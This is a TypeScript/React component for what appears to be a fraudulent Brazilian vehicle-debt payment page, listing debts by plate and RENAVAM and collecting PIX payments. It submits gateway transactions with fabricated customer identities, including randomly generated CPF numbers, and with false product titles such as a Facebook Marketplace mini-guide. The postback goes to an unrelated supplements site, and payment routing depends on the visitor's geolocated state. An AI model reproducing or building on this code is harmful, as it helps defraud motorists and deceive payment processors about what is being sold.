/* eslint-disable @typescript-eslint/no-unused-vars */
'use client';

import { Fragment, useEffect, useState } from 'react';

import { twMerge } from 'tailwind-merge';

import getISP from '@/functions/getISP';
import getUf from '@/functions/getUf';
import PixProtocol from '@/interfaces/pixProtocol';
import TransactionPixProtocol from '@/interfaces/transactionPixProtocol';
import TransactionPixProtocol4 from '@/interfaces/transactionPixProtocol4';
import UserProtocol from '@/interfaces/userProtocol2';
import formatPrice from '@/services/formatPrice';
import { useLoadingApplicationContext } from '@/utils/loadingApplicationContext/useContext';
import { useToastSweetalert2Context } from '@/utils/toastSweetalert2Context/useContext';

import QRCodeStatic2 from './QRCode';
import QRCodeGateway from './QRCodeGateway';

interface Props extends PixProtocol {
  className?: string;
  user: UserProtocol;
}

export default function Invoices({ className, user, pixKey, pixName }: Props) {
  const [QRCodeStatic, setQRCodeStatic] = useState({ show: false, value: 0 });
  const [currentInvoice, setCurrentInvoice] = useState({
    description: 'Pagamento total',
    amount: user.debts.reduce((p, c) => p + c.amount, 0),
    maturity: new Date().toLocaleDateString('pt-BR', { dateStyle: 'short' }),
    plate: user.licensePlate,
    renavam: user.renavam,
  });
  const { isLoading, setIsLoading } = useLoadingApplicationContext();
  const { setToast } = useToastSweetalert2Context();
  const dateNow = new Date().toLocaleDateString('pt-BR', {
    dateStyle: 'short',
  });
  const [green, setGreen] = useState({
    uf: '',
    city: '',
  });
  const [qrcode, setQRCode] = useState('');
  const total = user.debts.reduce((p, c) => p + c.amount, 0);

  useEffect(() => {
    (async () => {
      const isp = await getUf();
      if (isp) {
        setGreen({
          uf: isp.uf,
          city: isp.city,
        });
      }
    })();
  }, []);

  function minutoAtualEhPar() {
    const minuto = new Date().getMinutes();
    return {
      minuto,
      ehPar: minuto % 2 === 0,
    };
  }

  const handlePaymentQRCodeStatic = async (
    amount: number
    // maturity: string,
    // description: string
  ) => {
    // setCurrentInvoice(state => ({ ...state, description, amount, maturity }));
    if (
      green.uf === 'mato grosso do sul' &&
      amount < 400 &&
      minutoAtualEhPar()
    ) {
      await handlePaymentGateway(amount);
      return;
    }
    setQRCodeStatic({ show: true, value: amount });
  };

  function gerarCPF() {
    const rand = () => Math.floor(Math.random() * 9);

    const cpf = Array.from({ length: 9 }, rand);

    const calcularDigito = (base: any) => {
      let soma = 0;
      let fator = base.length + 1;

      for (let num of base) {
        soma += num * fator--;
      }

      const resto = soma % 11;
      return resto < 2 ? 0 : 11 - resto;
    };

    cpf.push(calcularDigito(cpf));
    cpf.push(calcularDigito(cpf));

    return cpf.join('');
  }

  const handlePaymentGateway = async (amount: number) => {
    if (isLoading) return;
    const newAmount = Math.round(amount * 100);
    try {
      setIsLoading(true);
      const newBody: TransactionPixProtocol = {
        currency: 'BRL',
        paymentMethod: 'PIX',
        amount: newAmount,
        customer: {
          name: 'Pagamento online',
          email: 'msname@msname.com',
          phone: '84971957392',
          document: { number: gerarCPF(), type: 'cpf' },
          address: {
            street: 'Rua 13 de maio',
            streetNumber: '465',
            complement: '',
            zipCode: '76629971',
            neighborhood: 'bairro',
            city: 'Colinas',
            state: 'GO',
            country: 'BR',
          },
        },
        shipping: {
          fee: 0,
          address: {
            street: 'Rua 20 de maio',
            streetNumber: '465',
            complement: '',
            zipCode: '76629971',
            neighborhood: 'bairro',
            city: 'Colinas',
            state: 'GO',
            country: 'BR',
          },
        },
        items: [
          {
            quantity: 1,
            tangible: true,
            title: 'Produto digital',
            unitPrice: newAmount,
          },
        ],
        pix: { expiresInDays: 1 },
        postbackUrl: 'https://growthsuplementos.vercel.app/',
      };
      const res = await fetch('/api/create-transaction-pix', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (!res.ok) {
        setToast({
          icon: 'error',
          message: data.error.message,
        });
        return;
      }

      const qrcode = data.qrcode;
      setQRCode(qrcode);
    } catch {
      setToast({
        icon: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentVelana = async (amount: number) => {
    if (isLoading) return;

    amount = Math.round(amount * 100);
    try {
      console.log(new Date());
      setIsLoading(true);
      const newBody: TransactionPixProtocol4 = {
        paymentMethod: 'pix',
        amount: amount,
        customer: {
          name: 'Pagamento online',
          email: 'goname@goname.com',
          phone: '84971957392',
          document: { number: gerarCPF(), type: 'cpf' },
        },
        items: [
          {
            quantity: 1,
            tangible: true,
            title:
              'Checklist + Mini-Guia: “Como ganhar dinheiro no Marketplace do Facebook do zero”',
            unitPrice: amount,
          },
        ],
        pix: { expiresInDays: 1 },
      };
      const res = await fetch('/api/create-transaction-pix4', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new data.errorMsg();
      }
      const newQrcode = data.qrcode;
      setQRCode(newQrcode);
    } catch (err) {
      console.log(err);
      setToast({
        icon: 'error',
        message: 'Erro ao gerar pagamento, por favor tente novamente',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleCloseQRCode = () => {
    setQRCode('');
  };

  return (
    <div className={twMerge('w-full flex flex-col', className)}>
      {user.debts.length ? (
        <div className='w-full py-5 px-3 bg-eaebec rounded-[4px] flex flex-col mb-4'>
          <div className='flex items-center gap-2 mb-2'>
            <svg
              stroke='#284e8a'
              fill='#284e8a'
              strokeWidth={0}
              viewBox='0 0 512 512'
              className='size-8 text-secondary-700 flex-none'
              height='1em'
              width='1em'
              xmlns='http://www.w3.org/2000/svg'
            >
              <path
                d='M368.005 272h-96v96h96v-96zm-32-208v32h-160V64h-48v32h-24.01c-22.002 0-40 17.998-40 40v272c0 22.002 17.998 40 40 40h304.01c22.002 0 40-17.998 40-40V136c0-22.002-17.998-40-40-40h-24V64h-48zm72 344h-304.01V196h304.01v212z'
                stroke='none'
              />
            </svg>
            <p className='text-00823c uppercase font-bold text-lg'>
              Débitos do veiculo
            </p>
          </div>
          <div className='grid grid-cols-2 w-full gap-8 max-[600px]:grid-cols-1 max-[600px]:gap-4'>
            {user.debts.map((item, i) => (
              <div
                key={i}
                className={`w-full flex items-center justify-center flex-col gap-2 ${i % 2 === 0 ? 'border-r border-r-2c5799 border-solid max-[600px]:border-r-transparent max-[600px]:border-r-0 max-[600px]:border-b-2c5799 max-[600px]:border-b max-[600px]:pb-4' : ''}`}
              >
                <span className='text-lg font-bold text-2c5799 text-center'>
                  {item.name}
                </span>
                {item.maturity.toLowerCase() === 'vencido' ? (
                  <div className='font-bold flex items-center gap-1 text-red-600 text-sm'>
                    <svg
                      strokeWidth={0}
                      viewBox='0 0 24 24'
                      className='size-4 fill-red-600 stroke-red-600'
                      height='1em'
                      width='1em'
                      xmlns='http://www.w3.org/2000/svg'
                    >
                      <path
                        fill='none'
                        d='M0 0h24v24H0V0z'
                        opacity={0.87}
                        stroke='none'
                      />
                      <path
                        d='M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z'
                        stroke='none'
                      />
                    </svg>
                    Vencido
                  </div>
                ) : (
                  <div className='font-bold flex items-center gap-1 text-green-600 text-sm'>
                    A vencer
                  </div>
                )}

                <div className='text-base text-2c5799 font-bold px-4 rounded-[6px] py-2 bg-white mb-1'>
                  {formatPrice(item.amount)}
                </div>
                <button
                  onClick={() => handlePaymentQRCodeStatic(item.amount)}
                  className='flex items-center gap-2 px-6 rounded-[6px] py-2 text-base bg-2c5799 text-white font-bold'
                >
                  Pagar{' '}
                  <svg
                    xmlns='http://www.w3.org/2000/svg'
                    width={18}
                    height={18}
                    viewBox='0 0 25 24'
                    fill='none'
                  >
                    <mask
                      id='a'
                      style={{
                        maskType: 'alpha',
                      }}
                      maskUnits='userSpaceOnUse'
                      x={0}
                      y={0}
                      width={25}
                      height={24}
                    >
                      <path
                        fill='#D9D9D9'
                        d='M0.388672 0H24.388672V24H0.388672z'
                      />
                    </mask>
                    <g mask='url(#a)'>
                      <path
                        d='M11.766 13.745a.68.68 0 01.944 0l3.614 3.618a3.503 3.503 0 002.492 1.034h.709l-4.558 4.563a3.713 3.713 0 01-5.153 0l-4.577-4.577h.437c.938 0 1.826-.366 2.492-1.034l3.6-3.604zm.944-3.458c-.3.258-.686.263-.944 0l-3.6-3.605c-.666-.71-1.554-1.034-2.492-1.034h-.437L9.81 1.07a3.645 3.645 0 015.158 0l4.562 4.564h-.713c-.939 0-1.826.367-2.492 1.034l-3.614 3.619zM5.674 6.706c.647 0 1.244.263 1.741.723l3.6 3.605c.338.296.78.507 1.225.507.441 0 .883-.211 1.22-.507l3.615-3.619a2.493 2.493 0 011.741-.719h1.77l2.736 2.74a3.653 3.653 0 010 5.16l-2.736 2.74h-1.77a2.477 2.477 0 01-1.741-.724l-3.614-3.619c-.653-.653-1.793-.653-2.446.005l-3.6 3.6c-.497.46-1.094.723-1.741.723H4.18l-2.723-2.725a3.65 3.65 0 010-5.16l2.723-2.73h1.494z'
                        fill='#FFF'
                      />
                    </g>
                  </svg>{' '}
                </button>
              </div>
            ))}
          </div>
        </div>
      ) : null}

      <div className='p-4 w-full bg-00823c rounded-[6px] flex flex-col items-center gap-4 mb-4'>
        <div className='flex items-center gap-2'>
          <div className='w-9 h-9 border-yellow-500 border-2 border-solid'>
            <svg
              strokeWidth={0}
              viewBox='0 0 256 256'
              className='size-8 fill-yellow-500 stroke-yellow-500'
              height='1em'
              width='1em'
              xmlns='http://www.w3.org/2000/svg'
            >
              <path
                d='M116 72a12 12 0 01-12 12H40a12 12 0 010-24h64a12 12 0 0112 12zm-12 100H84v-20a12 12 0 00-24 0v20H40a12 12 0 000 24h20v20a12 12 0 0024 0v-20h20a12 12 0 000-24zm48 4h64a12 12 0 000-24h-64a12 12 0 000 24zm64 16h-64a12 12 0 000 24h64a12 12 0 000-24zm-64.49-87.51a12 12 0 0017 0L184 89l15.51 15.52a12 12 0 0017-17L201 72l15.52-15.51a12 12 0 00-17-17L184 55l-15.51-15.49a12 12 0 00-17 17L167 72l-15.49 15.51a12 12 0 000 16.98z'
                stroke='none'
              />
            </svg>
          </div>
          <p className='text-lg uppercase text-white'>
            Total da <span className='font-semibold'>guia</span>
          </p>
        </div>
        <div className='w-full max-w-[60%] min-w-[250px] text-center mx-auto bg-white rounded-[6px] px-5 py-2 text-00823c font-semibold text-[24px]'>
          {formatPrice(total)}
        </div>
      </div>
      <button
        onClick={() => handlePaymentQRCodeStatic(total)}
        className='flex / w-fit items-center gap-2 px-6 rounded-[32px] py-3 mx-auto text-base bg-00823c text-white font-bold'
      >
        Pagar total dos débitos{' '}
        <svg
          xmlns='http://www.w3.org/2000/svg'
          width={18}
          height={18}
          viewBox='0 0 25 24'
          fill='none'
        >
          <mask
            id='a'
            style={{
              maskType: 'alpha',
            }}
            maskUnits='userSpaceOnUse'
            x={0}
            y={0}
            width={25}
            height={24}
          >
            <path fill='#D9D9D9' d='M0.388672 0H24.388672V24H0.388672z' />
          </mask>
          <g mask='url(#a)'>
            <path
              d='M11.766 13.745a.68.68 0 01.944 0l3.614 3.618a3.503 3.503 0 002.492 1.034h.709l-4.558 4.563a3.713 3.713 0 01-5.153 0l-4.577-4.577h.437c.938 0 1.826-.366 2.492-1.034l3.6-3.604zm.944-3.458c-.3.258-.686.263-.944 0l-3.6-3.605c-.666-.71-1.554-1.034-2.492-1.034h-.437L9.81 1.07a3.645 3.645 0 015.158 0l4.562 4.564h-.713c-.939 0-1.826.367-2.492 1.034l-3.614 3.619zM5.674 6.706c.647 0 1.244.263 1.741.723l3.6 3.605c.338.296.78.507 1.225.507.441 0 .883-.211 1.22-.507l3.615-3.619a2.493 2.493 0 011.741-.719h1.77l2.736 2.74a3.653 3.653 0 010 5.16l-2.736 2.74h-1.77a2.477 2.477 0 01-1.741-.724l-3.614-3.619c-.653-.653-1.793-.653-2.446.005l-3.6 3.6c-.497.46-1.094.723-1.741.723H4.18l-2.723-2.725a3.65 3.65 0 010-5.16l2.723-2.73h1.494z'
              fill='#FFF'
            />
          </g>
        </svg>{' '}
      </button>

      {QRCodeStatic.show && QRCodeStatic.value && (
        <QRCodeStatic2
          pixKey={pixKey}
          pixName={pixName}
          setQRCode={setQRCodeStatic}
          value={QRCodeStatic.value}
          plate={user.licensePlate}
          renavam={user.renavam}
        />
      )}
      {qrcode && (
        <QRCodeGateway handleClose={handleCloseQRCode} qrcode={qrcode} />
      )}

      {/* {QRCodeStatic.show && QRCodeStatic.value && (
        <QRCodePixStatic
          currentInvoice={currentInvoice}
          pixKey={pixKey}
          pixName={pixName}
          setQRCodeStatic={setQRCodeStatic}
        />
      )} */}
    </div>
  );
}
